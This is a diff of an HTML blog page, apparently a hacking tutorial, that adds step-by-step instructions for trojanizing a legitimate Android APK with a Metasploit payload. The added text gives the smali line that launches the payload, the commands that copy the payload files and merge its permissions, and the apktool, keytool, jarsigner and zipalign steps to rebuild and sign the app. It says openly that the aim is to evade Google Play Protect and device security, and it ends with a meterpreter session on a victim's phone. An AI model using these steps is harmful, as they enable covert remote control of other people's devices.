@@ -38,9 +38,9 @@
     </header>
 
     <nav>
-        <a href="/index.html">Home</a>
-        <a href="/about.html">About</a>
-        <a href="/contact.html">Contact</a>
+        <a href="/brsd/index.html">Home</a>
+        <a href="/brsd/about.html">About</a>
+        <a href="/brsd/contact.html">Contact</a>
     </nav>
 
     <p>In this blog I've discussed how we can generate a reverse shell or a meterpreter shell using metasploit
@@ -94,7 +94,8 @@
                 Once installed decode the payload using [apktool d payload.apk]. The decoded app directory will be
                 present in PWD with the same name as apk file, so in our case payload.
             </li>
-            <img src="/brsd/hacking/images/decode-payload.PNG" alt="decoding payload" style="width: 800px; height: 300px;">
+            <img src="/brsd/hacking/images/decode-payload.PNG" alt="decoding payload"
+                style="width: 800px; height: 300px;">
         </ul>
         <h2>Downlaod a legit apk and decode it</h2>
         <ul>
@@ -118,7 +119,132 @@
             </li>
             <img src="/brsd/hacking/images/AndroidManifest.PNG" alt="AndroidManifest.xml file"
                 style="width: 800px; height: 300px;">
+            <li>
+                From the above image we can see the main activity here is 'SplashActivity, and the path the it is
+                com.migal.android.splashactivity, and as it is a .smali file, we could find this inside the smali
+                directory of the unbundled apk. We can edit the SplashActivity.smali file using vim and add the payload
+                launching segment as a oncreate method.
+                <pre class="line-numbers">
+                    <code class="language-bash">
+                        invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
+                    </code>
+                 </pre>
+            </li>
+            <img src="/brsd/hacking/images/OncreateMethod.png" alt="Editing splashactivity file"
+                style="width: 800px; height: 300px;">
         </ul>
+        <h2>Add payload smail files to the original application file structure.</h2>
+        <ul>
+            <li>
+                Now we need to copy the smali files from the payload to the smali file structure in the Runbird bundle.
+            </li>
+            <pre class="line-numbers" width="100px">
+                <code class="language-bash">
+                    cp -r payload/smali/com/*  runbird/smali/com/
+                </code>
+             </pre>
+
+            <li>
+                Now modify the permission from the AndroidManifest.xml file of Runbird bundle. For this we can open the
+                AndroidManifest.xml files from both the bundle, i.e. payload and Runbird and copy just the permissions
+                from the payload into the Runbird. But androidmanifest file is already having some permissions. We need
+                to make sure that there will not be any duplicated permissions.
+            </li>
+            <img src="/brsd/hacking/images/add-permission.png" alt="editing androidmanifest file"
+                style="width: 800px; height: 400px;">
+            <li>
+                The whole concept of first copying the smali files to Runbird from payload and then modifying the
+                permissions on the Runbird AndroidManifest, was in order to bypass the google play protect and your
+                internal smartphone device security. If we try to use the payload apk directly after signing
+                it with a valid signature, it still gets blocked by google play protect atleast. So in here we have just
+                added a line of paylaod and few extra permission requests from the device owner, into the already
+                verified legit apk. Which in turns tricks google play protect and eventually the device internal
+                security to believe it as a legit verified apk.
+            </li>
+        </ul>
+        <h2>Rebuild the modified Runbird APK bundle</h2>
+        <ul>
+            <li>
+                Now if everything has been followed everything and everystep executed without any error, well then we
+                can proceed further to build back the Runbird apk.
+            </li>
+            <li>
+                In order to build the apk we will use 'apktool'. We can run [apktool b ./runbird]. After build is
+                complete the new .apk file will be present inside the 'runbird/dist/' folder.
+            </li>
+            <li>
+                Next step is to generating a key using the keytool. Before sending the malicious APK that created to the
+                victim user, that APK should be signed as a certified application. Generating a key is the first step of
+                certifying the APK. Key can be created using Keytool.
+            </li>
+            <pre class="line-numbers" width="100px">
+                <code class="language-bash">
+                    keytool -genkey -v -keystore key1.keystore -alias kali -keyalg RSA -keysize 1024 -validity 22222
+                </code>
+             </pre>
+        </ul>
+        <h2>Sign the apk using jarsigner and zipalign</h2>
+        <ul>
+            <li>
+                After creating the key, the malicious apk should be signed using that key. To do that we will use the
+                jarsigner tool.
+            </li>
+            <pre class="line-numbers" width="100px">
+                <code class="language-bash">
+                    jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key1.keystore runbird.apk kali
+                </code>
+             </pre>
+            <li>
+                -verbose is to verify the output. -sigalg define the algorithm to sign. -digestalg define the digest
+                algorithm. -keystore define the path to the key generated at the previous step. After that we can verify
+                it using jarsigner from below command.
+            </li>
+            <pre class="line-numbers" width="100px">
+                <code class="language-bash">
+                    jarsigner -verify -verbose -certs runbird.apk
+                </code>
+             </pre>
+            <li>
+                Now after signing using jarsigner, we need to verify the runbird.apk into a new .apk file using
+                Zipalign. This might not seem so useful, but trust me I believe that just by verifying to a new apk
+                solves
+                60% of the problem. We can do that using the below command.
+            </li>
+            <pre class="line-numbers" width="100px">
+                <code class="language-bash">
+                    zipalign -v 4 runbird.apk singed_jar.apk
+                </code>
+             </pre>
+        </ul>
+        <h2>Send new malicious apk and exploit using MSFconsole</h2>
+        <ul>
+            <li>
+                First we need to transfer the apk to victims phone, and install it.
+            </li>
+            <li>
+                On our machine (the machine which we have set the IP address for during the initial payload creation) we
+                can start a listner using MSFconsole.
+            </li>
+            <img src="/brsd/hacking/images/MSFconsole.PNG" alt="MSFconsole" style="width: 800px; height: 400px;">
+            <li>
+                Once we are in msfconsole, we need to select the exploit and then set the payload. Finally setting up
+                the LHOST and LPORT for listner.
+            </li>
+            <img src="/brsd/hacking/images/use-exploit.png" alt="setting up listner" style="width: 800px; height: 500px;">
+            <li>
+                Finally once set we can go ahead and type 'exploit' and that will start a listner on your end. So now
+                whenever victim opens the app, hurraaayyyy!! you've a meterpreter session.
+            </li>
+            <img src="/brsd/hacking/images/victims-meterpreter.png" alt="meterpreter session of victim"
+                style="width: 900px; height: 500px;">
+            <li>
+                This attack can be combined with few other attacks and we can get a permanent backdoor to the victim's
+                device, which is pretty bad and out of scope for our discussion. I just wanted to show how we can bypass
+                the existing Samsung galaxy s20 internal security and Google play protect.
+            </li>
+            <p style="color: red; font-size: large; text-align: center;">Cheers!!!</p>
+        </ul>
+
     </section>
 
     <footer>
